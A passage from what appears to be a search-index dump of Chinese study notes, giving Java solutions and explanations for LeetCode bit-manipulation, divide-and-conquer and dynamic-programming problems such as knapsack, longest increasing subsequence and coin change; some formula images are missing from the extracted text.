\u0026amp; mask) == 0) mask \u0026gt;\u0026gt;= 1; mask = (mask \u0026lt;\u0026lt; 1) - 1; return num ^ mask; } 可以利用 Java 的 Integer.highestOneBit() 方法来获得含有首 1 的数。\npublic int findComplement(int num) { if (num == 0) return 1; int mask = Integer.highestOneBit(num); mask = (mask \u0026lt;\u0026lt; 1) - 1; return num ^ mask; } 对于 10000000 这样的数要扩展成 11111111，可以利用以下方法：\nmask |= mask \u0026gt;\u0026gt; 1 11000000 mask |= mask \u0026gt;\u0026gt; 2 11110000 mask |= mask \u0026gt;\u0026gt; 4 11111111 public int findComplement(int num) { int mask = num; mask |= mask \u0026gt;\u0026gt; 1; mask |= mask \u0026gt;\u0026gt; 2; mask |= mask \u0026gt;\u0026gt; 4; mask |= mask \u0026gt;\u0026gt; 8; mask |= mask \u0026gt;\u0026gt; 16; return (mask ^ num); } 11. 实现整数的加法    371. Sum of Two Integers (Easy)\nLeetcode / 力扣\na ^ b 表示没有考虑进位的情况下两数的和，(a \u0026amp; b) \u0026lt;\u0026lt; 1 就是进位。\n递归会终止的原因是 (a \u0026amp; b) \u0026lt;\u0026lt; 1 最右边会多一个 0，那么继续递归，进位最右边的 0 会慢慢增多，最后进位会变为 0，递归终止。\npublic int getSum(int a, int b) { return b == 0 ? a : getSum((a ^ b), (a \u0026amp; b) \u0026lt;\u0026lt; 1); } 12. 字符串数组最大乘积    318. Maximum Product of Word Lengths (Medium)\nLeetcode / 力扣\nGiven [\u0026#34;abcw\u0026#34;, \u0026#34;baz\u0026#34;, \u0026#34;foo\u0026#34;, \u0026#34;bar\u0026#34;, \u0026#34;xtfn\u0026#34;, \u0026#34;abcdef\u0026#34;] Return 16 The two words can be \u0026#34;abcw\u0026#34;, \u0026#34;xtfn\u0026#34;. 题目描述：字符串数组的字符串只含有小写字符。求解字符串数组中两个字符串长度的最大乘积，要求这两个字符串不能含有相同字符。\n本题主要问题是判断两个字符串是否含相同字符，由于字符串只含有小写字符，总共 26 位，因此可以用一个 32 位的整数来存储每个字符是否出现过。\npublic int maxProduct(String[] words) { int n = words.length; int[] val = new int[n]; for (int i = 0; i \u0026lt; n; i++) { for (char c : words[i].toCharArray()) { val[i] |= 1 \u0026lt;\u0026lt; (c - \u0026#39;a\u0026#39;); } } int ret = 0; for (int i = 0; i \u0026lt; n; i++) { for (int j = i + 1; j \u0026lt; n; j++) { if ((val[i] \u0026amp; val[j]) == 0) { ret = Math.max(ret, words[i].length() * words[j].length()); } } } return ret; } 13. 统计从 0 ~ n 每个数的二进制表示中 1 的个数    338. Counting Bits (Medium)\nLeetcode / 力扣\n对于数字 6(110)，它可以看成是 4(100) 再加一个 2(10)，因此 dp[i] = dp[i\u0026amp;(i-1)] + 1;\npublic int[] countBits(int num) { int[] ret = new int[num + 1]; for(int i = 1; i \u0026lt;= num; i++){ ret[i] = ret[i\u0026amp;(i-1)] + 1; } return ret; } "},{"id":242,"href":"/%E7%AC%94%E8%AE%B0/Leetcode-/LeetcodeLeetcode-%E9%A2%98%E8%A7%A3-%E5%88%86%E6%B2%BB/","title":"Leetcode 题解 - 分治","parent":"笔记","content":"Leetcode 题解 - 分治     Leetcode 题解 - 分治  1. 给表达式加括号 2. 不同的二叉搜索树    1. 给表达式加括号    241. Different Ways to Add Parentheses (Medium)\nLeetcode / 力扣\nInput: \u0026#34;2-1-1\u0026#34;. ((2-1)-1) = 0 (2-(1-1)) = 2 Output : [0, 2] public List\u0026lt;Integer\u0026gt; diffWaysToCompute(String input) { List\u0026lt;Integer\u0026gt; ways = new ArrayList\u0026lt;\u0026gt;(); for (int i = 0; i \u0026lt; input.length(); i++) { char c = input.charAt(i); if (c == \u0026#39;+\u0026#39; || c == \u0026#39;-\u0026#39; || c == \u0026#39;*\u0026#39;) { List\u0026lt;Integer\u0026gt; left = diffWaysToCompute(input.substring(0, i)); List\u0026lt;Integer\u0026gt; right = diffWaysToCompute(input.substring(i + 1)); for (int l : left) { for (int r : right) { switch (c) { case \u0026#39;+\u0026#39;: ways.add(l + r); break; case \u0026#39;-\u0026#39;: ways.add(l - r); break; case \u0026#39;*\u0026#39;: ways.add(l * r); break; } } } } } if (ways.size() == 0) { ways.add(Integer.valueOf(input)); } return ways; } 2. 不同的二叉搜索树    95. Unique Binary Search Trees II (Medium)\nLeetcode / 力扣\n给定一个数字 n，要求生成所有值为 1\u0026hellip;n 的二叉搜索树。\nInput: 3 Output: [ [1,null,3,2], [3,2,null,1], [3,1,null,null,2], [2,1,3], [1,null,2,null,3] ] Explanation: The above output corresponds to the 5 unique BST\u0026#39;s shown below: 1 3 3 2 1 \\ / / / \\ \\ 3 2 1 1 3 2 / / \\ \\ 2 1 2 3 public List\u0026lt;TreeNode\u0026gt; generateTrees(int n) { if (n \u0026lt; 1) { return new LinkedList\u0026lt;TreeNode\u0026gt;(); } return generateSubtrees(1, n); } private List\u0026lt;TreeNode\u0026gt; generateSubtrees(int s, int e) { List\u0026lt;TreeNode\u0026gt; res = new LinkedList\u0026lt;TreeNode\u0026gt;(); if (s \u0026gt; e) { res.add(null); return res; } for (int i = s; i \u0026lt;= e; ++i) { List\u0026lt;TreeNode\u0026gt; leftSubtrees = generateSubtrees(s, i - 1); List\u0026lt;TreeNode\u0026gt; rightSubtrees = generateSubtrees(i + 1, e); for (TreeNode left : leftSubtrees) { for (TreeNode right : rightSubtrees) { TreeNode root = new TreeNode(i); root.left = left; root.right = right; res.add(root); } } } return res; } "},{"id":243,"href":"/%E7%AC%94%E8%AE%B0/Leetcode-/LeetcodeLeetcode-%E9%A2%98%E8%A7%A3-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/","title":"Leetcode 题解 - 动态规划","parent":"笔记","content":"Leetcode 题解 - 动态规划     Leetcode 题解 - 动态规划  斐波那契数列  1. 爬楼梯 2. 强盗抢劫 3. 强盗在环形街区抢劫 4. 信件错排 5. 母牛生产   矩阵路径  1. 矩阵的最小路径和 2. 矩阵的总路径数   数组区间  1. 数组区间和 2. 数组中等差递增子区间的个数   分割整数  1. 分割整数的最大乘积 2. 按平方数来分割整数 3. 分割整数构成字母字符串   最长递增子序列  1. 最长递增子序列 2. 一组整数对能够构成的最长链 3. 最长摆动子序列   最长公共子序列  1. 最长公共子序列   0-1 背包  1. 划分数组为和相等的两部分 2. 改变一组数的正负号使得它们的和为一给定数 3. 01 字符构成最多的字符串 4. 找零钱的最少硬币数 5. 找零钱的硬币数组合 6. 字符串按单词列表分割 7. 组合总和   股票交易  1. 需要冷却期的股票交易 2. 需要交易费用的股票交易 3. 只能进行两次的股票交易 4. 只能进行 k 次的股票交易   字符串编辑  1. 删除两个字符串的字符使它们相等 2. 编辑距离 3. 复制粘贴字符      递归和动态规划都是将原问题拆成多个子问题然后求解，他们之间最本质的区别是，动态规划保存了子问题的解，避免重复计算。\n斐波那契数列    1. 爬楼梯    70. Climbing Stairs (Easy)\nLeetcode / 力扣\n题目描述：有 N 阶楼梯，每次可以上一阶或者两阶，求有多少种上楼梯的方法。\n定义一个数组 dp 存储上楼梯的方法数（为了方便讨论，数组下标从 1 开始），dp[i] 表示走到第 i 个楼梯的方法数目。\n第 i 个楼梯可以从第 i-1 和 i-2 个楼梯再走一步到达，走到第 i 个楼梯的方法数为走到第 i-1 和第 i-2 个楼梯的方法数之和。\n -- \n考虑到 dp[i] 只与 dp[i - 1] 和 dp[i - 2] 有关，因此可以只用两个变量来存储 dp[i - 1] 和 dp[i - 2]，使得原来的 O(N) 空间复杂度优化为 O(1) 复杂度。\npublic int climbStairs(int n) { if (n \u0026lt;= 2) { return n; } int pre2 = 1, pre1 = 2; for (int i = 2; i \u0026lt; n; i++) { int cur = pre1 + pre2; pre2 = pre1; pre1 = cur; } return pre1; } 2. 强盗抢劫    198. House Robber (Easy)\nLeetcode / 力扣\n题目描述：抢劫一排住户，但是不能抢邻近的住户，求最大抢劫量。\n定义 dp 数组用来存储最大的抢劫量，其中 dp[i] 表示抢到第 i 个住户时的最大抢劫量。\n由于不能抢劫邻近住户，如果抢劫了第 i -1 个住户，那么就不能再抢劫第 i 个住户，所以\n -- \npublic int rob(int[] nums) { int pre2 = 0, pre1 = 0; for (int i = 0; i \u0026lt; nums.length; i++) { int cur = Math.max(pre2 + nums[i], pre1); pre2 = pre1; pre1 = cur; } return pre1; } 3. 强盗在环形街区抢劫    213. House Robber II (Medium)\nLeetcode / 力扣\npublic int rob(int[] nums) { if (nums == null || nums.length == 0) { return 0; } int n = nums.length; if (n == 1) { return nums[0]; } return Math.max(rob(nums, 0, n - 2), rob(nums, 1, n - 1)); } private int rob(int[] nums, int first, int last) { int pre2 = 0, pre1 = 0; for (int i = first; i \u0026lt;= last; i++) { int cur = Math.max(pre1, pre2 + nums[i]); pre2 = pre1; pre1 = cur; } return pre1; } 4. 信件错排    题目描述：有 N 个 信 和 信封，它们被打乱，求错误装信方式的数量。\n定义一个数组 dp 存储错误方式数量，dp[i] 表示前 i 个信和信封的错误方式数量。假设第 i 个信装到第 j 个信封里面，而第 j 个信装到第 k 个信封里面。根据 i 和 k 是否相等，有两种情况：\n i==k，交换 i 和 j 的信后，它们的信和信封在正确的位置，但是其余 i-2 封信有 dp[i-2] 种错误装信的方式。由于 j 有 i-1 种取值，因此共有 (i-1)*dp[i-2] 种错误装信方式。 i != k，交换 i 和 j 的信后，第 i 个信和信封在正确的位置，其余 i-1 封信有 dp[i-1] 种错误装信方式。由于 j 有 i-1 种取值，因此共有 (i-1)*dp[i-1] 种错误装信方式。  综上所述，错误装信数量方式数量为：\n -- \n5. 母牛生产    程序员代码面试指南-P181\n题目描述：假设农场中成熟的母牛每年都会生 1 头小母牛，并且永远不会死。第一年有 1 只小母牛，从第二年开始，母牛开始生小母牛。每只小母牛 3 年之后成熟又可以生小母牛。给定整数 N，求 N 年后牛的数量。\n第 i 年成熟的牛的数量为：\n -- \n矩阵路径    1. 矩阵的最小路径和    64. Minimum Path Sum (Medium)\nLeetcode / 力扣\n[[1,3,1], [1,5,1], [4,2,1]] Given the above grid map, return 7. Because the path 1→3→1→1→1 minimizes the sum. 题目描述：求从矩阵的左上角到右下角的最小路径和，每次只能向右和向下移动。\npublic int minPathSum(int[][] grid) { if (grid.length == 0 || grid[0].length == 0) { return 0; } int m = grid.length, n = grid[0].length; int[] dp = new int[n]; for (int i = 0; i \u0026lt; m; i++) { for (int j = 0; j \u0026lt; n; j++) { if (j == 0) { dp[j] = dp[j]; // 只能从上侧走到该位置  } else if (i == 0) { dp[j] = dp[j - 1]; // 只能从左侧走到该位置  } else { dp[j] = Math.min(dp[j - 1], dp[j]); } dp[j] += grid[i][j]; } } return dp[n - 1]; } 2. 矩阵的总路径数    62. Unique Paths (Medium)\nLeetcode / 力扣\n题目描述：统计从矩阵左上角到右下角的路径总数，每次只能向右或者向下移动。\n\npublic int uniquePaths(int m, int n) { int[] dp = new int[n]; Arrays.fill(dp, 1); for (int i = 1; i \u0026lt; m; i++) { for (int j = 1; j \u0026lt; n; j++) { dp[j] = dp[j] + dp[j - 1]; } } return dp[n - 1]; } 也可以直接用数学公式求解，这是一个组合问题。机器人总共移动的次数 S=m+n-2，向下移动的次数 D=m-1，那么问题可以看成从 S 中取出 D 个位置的组合数量，这个问题的解为 C(S, D)。\npublic int uniquePaths(int m, int n) { int S = m + n - 2; // 总共的移动次数  int D = m - 1; // 向下的移动次数  long ret = 1; for (int i = 1; i \u0026lt;= D; i++) { ret = ret * (S - D + i) / i; } return (int) ret; } 数组区间    1. 数组区间和    303. Range Sum Query - Immutable (Easy)\nLeetcode / 力扣\nGiven nums = [-2, 0, 3, -5, 2, -1] sumRange(0, 2) -\u0026gt; 1 sumRange(2, 5) -\u0026gt; -1 sumRange(0, 5) -\u0026gt; -3 求区间 i ~ j 的和，可以转换为 sum[j + 1] - sum[i]，其中 sum[i] 为 0 ~ i - 1 的和。\nclass NumArray { private int[] sums; public NumArray(int[] nums) { sums = new int[nums.length + 1]; for (int i = 1; i \u0026lt;= nums.length; i++) { sums[i] = sums[i - 1] + nums[i - 1]; } } public int sumRange(int i, int j) { return sums[j + 1] - sums[i]; } } 2. 数组中等差递增子区间的个数    413. Arithmetic Slices (Medium)\nLeetcode / 力扣\nA = [0, 1, 2, 3, 4] return: 6, for 3 arithmetic slices in A: [0, 1, 2], [1, 2, 3], [0, 1, 2, 3], [0, 1, 2, 3, 4], [ 1, 2, 3, 4], [2, 3, 4] dp[i] 表示以 A[i] 为结尾的等差递增子区间的个数。\n当 A[i] - A[i-1] == A[i-1] - A[i-2]，那么 [A[i-2], A[i-1], A[i]] 构成一个等差递增子区间。而且在以 A[i-1] 为结尾的递增子区间的后面再加上一个 A[i]，一样可以构成新的递增子区间。\ndp[2] = 1 [0, 1, 2] dp[3] = dp[2] + 1 = 2 [0, 1, 2, 3], // [0, 1, 2] 之后加一个 3 [1, 2, 3] // 新的递增子区间 dp[4] = dp[3] + 1 = 3 [0, 1, 2, 3, 4], // [0, 1, 2, 3] 之后加一个 4 [1, 2, 3, 4], // [1, 2, 3] 之后加一个 4 [2, 3, 4] // 新的递增子区间 综上，在 A[i] - A[i-1] == A[i-1] - A[i-2] 时，dp[i] = dp[i-1] + 1。\n因为递增子区间不一定以最后一个元素为结尾，可以是任意一个元素结尾，因此需要返回 dp 数组累加的结果。\npublic int numberOfArithmeticSlices(int[] A) { if (A == null || A.length == 0) { return 0; } int n = A.length; int[] dp = new int[n]; for (int i = 2; i \u0026lt; n; i++) { if (A[i] - A[i - 1] == A[i - 1] - A[i - 2]) { dp[i] = dp[i - 1] + 1; } } int total = 0; for (int cnt : dp) { total += cnt; } return total; } 分割整数    1. 分割整数的最大乘积    343. Integer Break (Medim)\nLeetcode / 力扣\n题目描述：For example, given n = 2, return 1 (2 = 1 + 1); given n = 10, return 36 (10 = 3 + 3 + 4).\npublic int integerBreak(int n) { int[] dp = new int[n + 1]; dp[1] = 1; for (int i = 2; i \u0026lt;= n; i++) { for (int j = 1; j \u0026lt;= i - 1; j++) { dp[i] = Math.max(dp[i], Math.max(j * dp[i - j], j * (i - j))); } } return dp[n]; } 2. 按平方数来分割整数    279. Perfect Squares(Medium)\nLeetcode / 力扣\n题目描述：For example, given n = 12, return 3 because 12 = 4 + 4 + 4; given n = 13, return 2 because 13 = 4 + 9.\npublic int numSquares(int n) { List\u0026lt;Integer\u0026gt; squareList = generateSquareList(n); int[] dp = new int[n + 1]; for (int i = 1; i \u0026lt;= n; i++) { int min = Integer.MAX_VALUE; for (int square : squareList) { if (square \u0026gt; i) { break; } min = Math.min(min, dp[i - square] + 1); } dp[i] = min; } return dp[n]; } private List\u0026lt;Integer\u0026gt; generateSquareList(int n) { List\u0026lt;Integer\u0026gt; squareList = new ArrayList\u0026lt;\u0026gt;(); int diff = 3; int square = 1; while (square \u0026lt;= n) { squareList.add(square); square += diff; diff += 2; } return squareList; } 3. 分割整数构成字母字符串    91. Decode Ways (Medium)\nLeetcode / 力扣\n题目描述：Given encoded message \u0026ldquo;12\u0026rdquo;, it could be decoded as \u0026ldquo;AB\u0026rdquo; (1 2) or \u0026ldquo;L\u0026rdquo; (12).\npublic int numDecodings(String s) { if (s == null || s.length() == 0) { return 0; } int n = s.length(); int[] dp = new int[n + 1]; dp[0] = 1; dp[1] = s.charAt(0) == \u0026#39;0\u0026#39; ? 0 : 1; for (int i = 2; i \u0026lt;= n; i++) { int one = Integer.valueOf(s.substring(i - 1, i)); if (one != 0) { dp[i] += dp[i - 1]; } if (s.charAt(i - 2) == \u0026#39;0\u0026#39;) { continue; } int two = Integer.valueOf(s.substring(i - 2, i)); if (two \u0026lt;= 26) { dp[i] += dp[i - 2]; } } return dp[n]; } 最长递增子序列    已知一个序列 {S1, S2,\u0026hellip;,Sn}，取出若干数组成新的序列 {Si1, Si2,\u0026hellip;, Sim}，其中 i1、i2 \u0026hellip; im 保持递增，即新序列中各个数仍然保持原数列中的先后顺序，称新序列为原序列的一个 子序列 。\n如果在子序列中，当下标 ix \u0026gt; iy 时，Six \u0026gt; Siy，称子序列为原序列的一个 递增子序列 。\n定义一个数组 dp 存储最长递增子序列的长度，dp[n] 表示以 Sn 结尾的序列的最长递增子序列长度。对于一个递增子序列 {Si1, Si2,\u0026hellip;,Sim}，如果 im \u0026lt; n 并且 Sim \u0026lt; Sn，此时 {Si1, Si2,\u0026hellip;, Sim, Sn} 为一个递增子序列，递增子序列的长度增加 1。满足上述条件的递增子序列中，长度最长的那个递增子序列就是要找的，在长度最长的递增子序列上加上 Sn 就构成了以 Sn 为结尾的最长递增子序列。因此 dp[n] = max{ dp[i]+1 | Si \u0026lt; Sn \u0026amp;\u0026amp; i \u0026lt; n} 。\n因为在求 dp[n] 时可能无法找到一个满足条件的递增子序列，此时 {Sn} 就构成了递增子序列，需要对前面的求解方程做修改，令 dp[n] 最小为 1，即：\n -- \n对于一个长度为 N 的序列，最长递增子序列并不一定会以 SN 为结尾，因此 dp[N] 不是序列的最长递增子序列的长度，需要遍历 dp 数组找出最大值才是所要的结果，max{ dp[i] | 1 \u0026lt;= i \u0026lt;= N} 即为所求。\n1. 最长递增子序列    300. Longest Increasing Subsequence (Medium)\nLeetcode / 力扣\npublic int lengthOfLIS(int[] nums) { int n = nums.length; int[] dp = new int[n]; for (int i = 0; i \u0026lt; n; i++) { int max = 1; for (int j = 0; j \u0026lt; i; j++) { if (nums[i] \u0026gt; nums[j]) { max = Math.max(max, dp[j] + 1); } } dp[i] = max; } return Arrays.stream(dp).max().orElse(0); } 使用 Stream 求最大值会导致运行时间过长，可以改成以下形式：\nint ret = 0; for (int i = 0; i \u0026lt; n; i++) { ret = Math.max(ret, dp[i]); } return ret; 以上解法的时间复杂度为 O(N2)，可以使用二分查找将时间复杂度降低为 O(NlogN)。\n定义一个 tails 数组，其中 tails[i] 存储长度为 i + 1 的最长递增子序列的最后一个元素。对于一个元素 x，\n 如果它大于 tails 数组所有的值，那么把它添加到 tails 后面，表示最长递增子序列长度加 1； 如果 tails[i-1] \u0026lt; x \u0026lt;= tails[i]，那么更新 tails[i] = x。  例如对于数组 [4,3,6,5]，有：\ntails len num [] 0 4 [4] 1 3 [3] 1 6 [3,6] 2 5 [3,5] 2 null 可以看出 tails 数组保持有序，因此在查找 Si 位于 tails 数组的位置时就可以使用二分查找。\npublic int lengthOfLIS(int[] nums) { int n = nums.length; int[] tails = new int[n]; int len = 0; for (int num : nums) { int index = binarySearch(tails, len, num); tails[index] = num; if (index == len) { len++; } } return len; } private int binarySearch(int[] tails, int len, int key) { int l = 0, h = len; while (l \u0026lt; h) { int mid = l + (h - l) / 2; if (tails[mid] == key) { return mid; } else if (tails[mid] \u0026gt; key) { h = mid; } else { l = mid + 1; } } return l; } 2. 一组整数对能够构成的最长链    646. Maximum Length of Pair Chain (Medium)\nLeetcode / 力扣\nInput: [[1,2], [2,3], [3,4]] Output: 2 Explanation: The longest chain is [1,2] -\u0026gt; [3,4] 题目描述：对于 (a, b) 和 (c, d) ，如果 b \u0026lt; c，则它们可以构成一条链。\npublic int findLongestChain(int[][] pairs) { if (pairs == null || pairs.length == 0) { return 0; } Arrays.sort(pairs, (a, b) -\u0026gt; (a[0] - b[0])); int n = pairs.length; int[] dp = new int[n]; Arrays.fill(dp, 1); for (int i = 1; i \u0026lt; n; i++) { for (int j = 0; j \u0026lt; i; j++) { if (pairs[j][1] \u0026lt; pairs[i][0]) { dp[i] = Math.max(dp[i], dp[j] + 1); } } } return Arrays.stream(dp).max().orElse(0); } 3. 最长摆动子序列    376. Wiggle Subsequence (Medium)\nLeetcode / 力扣\nInput: [1,7,4,9,2,5] Output: 6 The entire sequence is a wiggle sequence. Input: [1,17,5,10,13,15,10,5,16,8] Output: 7 There are several subsequences that achieve this length. One is [1,17,10,13,10,16,8]. Input: [1,2,3,4,5,6,7,8,9] Output: 2 要求：使用 O(N) 时间复杂度求解。\npublic int wiggleMaxLength(int[] nums) { if (nums == null || nums.length == 0) { return 0; } int up = 1, down = 1; for (int i = 1; i \u0026lt; nums.length; i++) { if (nums[i] \u0026gt; nums[i - 1]) { up = down + 1; } else if (nums[i] \u0026lt; nums[i - 1]) { down = up + 1; } } return Math.max(up, down); } 最长公共子序列    对于两个子序列 S1 和 S2，找出它们最长的公共子序列。\n定义一个二维数组 dp 用来存储最长公共子序列的长度，其中 dp[i][j] 表示 S1 的前 i 个字符与 S2 的前 j 个字符最长公共子序列的长度。考虑 S1i 与 S2j 值是否相等，分为两种情况：\n 当 S1i==S2j 时，那么就能在 S1 的前 i-1 个字符与 S2 的前 j-1 个字符最长公共子序列的基础上再加上 S1i 这个值，最长公共子序列长度加 1，即 dp[i][j] = dp[i-1][j-1] + 1。 当 S1i != S2j 时，此时最长公共子序列为 S1 的前 i-1 个字符和 S2 的前 j 个字符最长公共子序列，或者 S1 的前 i 个字符和 S2 的前 j-1 个字符最长公共子序列，取它们的最大者，即 dp[i][j] = max{ dp[i-1][j], dp[i][j-1] }。  综上，最长公共子序列的状态转移方程为：\nS2_j}\\end{array}\\right.\" class=\"mathjax-pic\"/ -- \n对于长度为 N 的序列 S1 和长度为 M 的序列 S2，dp[N][M] 就是序列 S1 和序列 S2 的最长公共子序列长度。\n与最长递增子序列相比，最长公共子序列有以下不同点：\n 针对的是两个序列，求它们的最长公共子序列。 在最长递增子序列中，dp[i] 表示以 Si 为结尾的最长递增子序列长度，子序列必须包含 Si ；在最长公共子序列中，dp[i][j] 表示 S1 中前 i 个字符与 S2 中前 j 个字符的最长公共子序列长度，不一定包含 S1i 和 S2j。 在求最终解时，最长公共子序列中 dp[N][M] 就是最终解，而最长递增子序列中 dp[N] 不是最终解，因为以 SN 为结尾的最长递增子序列不一定是整个序列最长递增子序列，需要遍历一遍 dp 数组找到最大者。  1. 最长公共子序列    1143. Longest Common Subsequence\nLeetcode / 力扣\npublic int longestCommonSubsequence(String text1, String text2) { int n1 = text1.length(), n2 = text2.length(); int[][] dp = new int[n1 + 1][n2 + 1]; for (int i = 1; i \u0026lt;= n1; i++) { for (int j = 1; j \u0026lt;= n2; j++) { if (text1.charAt(i - 1) == text2.charAt(j - 1)) { dp[i][j] = dp[i - 1][j - 1] + 1; } else { dp[i][j] = Math.max(dp[i - 1][j], dp[i][j - 1]); } } } return dp[n1][n2]; } 0-1 背包    有一个容量为 N 的背包，要用这个背包装下物品的价值最大，这些物品有两个属性：体积 w 和价值 v。\n定义一个二维数组 dp 存储最大价值，其中 dp[i][j] 表示前 i 件物品体积不超过 j 的情况下能达到的最大价值。设第 i 件物品体积为 w，价值为 v，根据第 i 件物品是否添加到背包中，可以分两种情况讨论：\n 第 i 件物品没添加到背包，总体积不超过 j 的前 i 件物品的最大价值就是总体积不超过 j 的前 i-1 件物品的最大价值，dp[i][j] = dp[i-1][j]。 第 i 件物品添加到背包中，dp[i][j] = dp[i-1][j-w] + v。  第 i 件物品可添加也可以不添加，取决于哪种情况下最大价值更大。因此，0-1 背包的状态转移方程为：\n -- \n// W 为背包总体积 // N 为物品数量 // weights 数组存储 N 个物品的重量 // values 数组存储 N 个物品的价值 public int knapsack(int W, int N, int[] weights, int[] values) { int[][] dp = new int[N + 1][W + 1]; for (int i = 1; i \u0026lt;= N; i++) { int w = weights[i - 1], v = values[i - 1]; for (int j = 1; j \u0026lt;= W; j++) { if (j \u0026gt;= w) { dp[i][j] = Math.max(dp[i - 1][j], dp[i - 1][j - w] + v); } else { dp[i][j] = dp[i - 1][j]; } } } return dp[N][W]; } 空间优化\n在程序实现时可以对 0-1 背包做优化。观察状态转移方程可以知道，前 i 件物品的状态仅与前 i-1 件物品的状态有关，因此可以将 dp 定义为一维数组，其中 dp[j] 既可以表示 dp[i-1][j] 也可以表示 dp[i][j]。此时，\n -- \n因为 dp[j-w] 表示 dp[i-1][j-w]，因此不能先求 dp[i][j-w]，防止将 dp[i-1][j-w] 覆盖。也就是说要先计算 dp[i][j] 再计算 dp[i][j-w]，在程序实现时需要按倒序来循环求解。\npublic int knapsack(int W, int N, int[] weights, int[] values) { int[] dp = new int[W + 1]; for (int i = 1; i \u0026lt;= N; i++) { int w = weights[i - 1], v = values[i - 1]; for (int j = W; j \u0026gt;= 1; j--) { if (j \u0026gt;= w) { dp[j] = Math.max(dp[j], dp[j - w] + v); } } } return dp[W]; } 无法使用贪心算法的解释\n0-1 背包问题无法使用贪心算法来求解，也就是说不能按照先添加性价比最高的物品来达到最优，这是因为这种方式可能造成背包空间的浪费，从而无法达到最优。考虑下面的物品和一个容量为 5 的背包，如果先添加物品 0 再添加物品 1，那么只能存放的价值为 16，浪费了大小为 2 的空间。最优的方式是存放物品 1 和物品 2，价值为 22.\n   id w v v/w     0 1 6 6   1 2 10 5   2 3 12 4    变种\n  完全背包：物品数量为无限个\n  多重背包：物品数量有限制\n  多维费用背包：物品不仅有重量，还有体积，同时考虑这两种限制\n  其它：物品之间相互约束或者依赖\n  1. 划分数组为和相等的两部分    416. Partition Equal Subset Sum (Medium)\nLeetcode / 力扣\nInput: [1, 5, 11, 5] Output: true Explanation: The array can be partitioned as [1, 5, 5] and [11]. 可以看成一个背包大小为 sum/2 的 0-1 背包问题。\npublic boolean canPartition(int[] nums) { int sum = computeArraySum(nums); if (sum % 2 != 0) { return false; } int W = sum / 2; boolean[] dp = new boolean[W + 1]; dp[0] = true; for (int num : nums) { // 0-1 背包一个物品只能用一次  for (int i = W; i \u0026gt;= num; i--) { // 从后往前，先计算 dp[i] 再计算 dp[i-num]  dp[i] = dp[i] || dp[i - num]; } } return dp[W]; } private int computeArraySum(int[] nums) { int sum = 0; for (int num : nums) { sum += num; } return sum; } 2. 改变一组数的正负号使得它们的和为一给定数    494. Target Sum (Medium)\nLeetcode / 力扣\nInput: nums is [1, 1, 1, 1, 1], S is 3. Output: 5 Explanation: -1+1+1+1+1 = 3 +1-1+1+1+1 = 3 +1+1-1+1+1 = 3 +1+1+1-1+1 = 3 +1+1+1+1-1 = 3 There are 5 ways to assign symbols to make the sum of nums be target 3. 该问题可以转换为 Subset Sum 问题，从而使用 0-1 背包的方法来求解。\n可以将这组数看成两部分，P 和 N，其中 P 使用正号，N 使用负号，有以下推导：\nsum(P) - sum(N) = target sum(P) + sum(N) + sum(P) - sum(N) = target + sum(P) + sum(N) 2 * sum(P) = target + sum(nums) 因此只要找到一个子集，令它们都取正号，并且和等于 (target + sum(nums))/2，就证明存在解。\npublic int findTargetSumWays(int[] nums, int S) { int sum = computeArraySum(nums); if (sum \u0026lt; S || (sum + S) % 2 == 1) { return 0; } int W = (sum + S) / 2; int[] dp = new int[W + 1]; dp[0] = 1; for (int num : nums) { for (int i = W; i \u0026gt;= num; i--) { dp[i] = dp[i] + dp[i - num]; } } return dp[W]; } private int computeArraySum(int[] nums) { int sum = 0; for (int num : nums) { sum += num; } return sum; } DFS 解法：\npublic int findTargetSumWays(int[] nums, int S) { return findTargetSumWays(nums, 0, S); } private int findTargetSumWays(int[] nums, int start, int S) { if (start == nums.length) { return S == 0 ? 1 : 0; } return findTargetSumWays(nums, start + 1, S + nums[start]) + findTargetSumWays(nums, start + 1, S - nums[start]); } 3. 01 字符构成最多的字符串    474. Ones and Zeroes (Medium)\nLeetcode / 力扣\nInput: Array = {\u0026#34;10\u0026#34;, \u0026#34;0001\u0026#34;, \u0026#34;111001\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;0\u0026#34;}, m = 5, n = 3 Output: 4 Explanation: There are totally 4 strings can be formed by the using of 5 0s and 3 1s, which are \u0026#34;10\u0026#34;,\u0026#34;0001\u0026#34;,\u0026#34;1\u0026#34;,\u0026#34;0\u0026#34; 这是一个多维费用的 0-1 背包问题，有两个背包大小，0 的数量和 1 的数量。\npublic int findMaxForm(String[] strs, int m, int n) { if (strs == null || strs.length == 0) { return 0; } int[][] dp = new int[m + 1][n + 1]; for (String s : strs) { // 每个字符串只能用一次  int ones = 0, zeros = 0; for (char c : s.toCharArray()) { if (c == \u0026#39;0\u0026#39;) { zeros++; } else { ones++; } } for (int i = m; i \u0026gt;= zeros; i--) { for (int j = n; j \u0026gt;= ones; j--) { dp[i][j] = Math.max(dp[i][j], dp[i - zeros][j - ones] + 1); } } } return dp[m][n]; } 4. 找零钱的最少硬币数    322. Coin Change (Medium)\nLeetcode / 力扣\nExample 1: coins = [1, 2, 5], amount = 11 return 3 (11 = 5 + 5 + 1) Example 2: coins = [2], amount = 3 return -1. 题目描述：给一些面额的硬币，要求用这些硬币来组成给定面额的钱数，并且使得硬币数量最少。硬币可以重复使用。\n 物品：硬币 物品大小：面额 物品价值：数量  因为硬币可以重复使用，因此这是一个完全背包问题。完全背包只需要将 0-1 背包的逆序遍历 dp 数组改为正序遍历即可。\npublic int coinChange(int[] coins, int amount) { if (amount == 0 || coins == null) return 0; int[] dp = new int[amount + 1]; for (int coin : coins) { for (int i = coin; i \u0026lt;= amount; i++) { //将逆序遍历改为正序遍历  if (i == coin) { dp[i] = 1; } else if (dp[i] == 0 \u0026amp;\u0026amp; dp[i - coin] != 0) { dp[i] = dp[i - coin] + 1; } else if (dp[i - coin] != 0) { dp[i] = Math.min(dp[i], dp[i - coin] + 1); } } } return dp[amount] == 0 ? -1 : dp[amount]; } 5. 找零钱的硬币数组合    518. Coin Change 2 (Medium)\nLeetcode / 力扣\nInput: amount = 5, coins = [1, 2, 5] Output: 4 Explanation: there are four ways to make up the amount: 5=5 5=2+2+1 5=2+1+1+1 5=1+1+1+1+1 完全背包问题，使用 dp 记录可达成目标的组合数目。\npublic int change(int amount, int[] coins) { if (coins == null) { return 0; } int[] dp = new int[amount + 1]; dp[0] = 1; for (int coin : coins) { for (int i = coin; i \u0026lt;= amount; i++) { dp[i] += dp[i - coin]; } } return dp[amount]; } 6. 字符串按单词列表分割    139. Word Break (Medium)\nLeetcode / 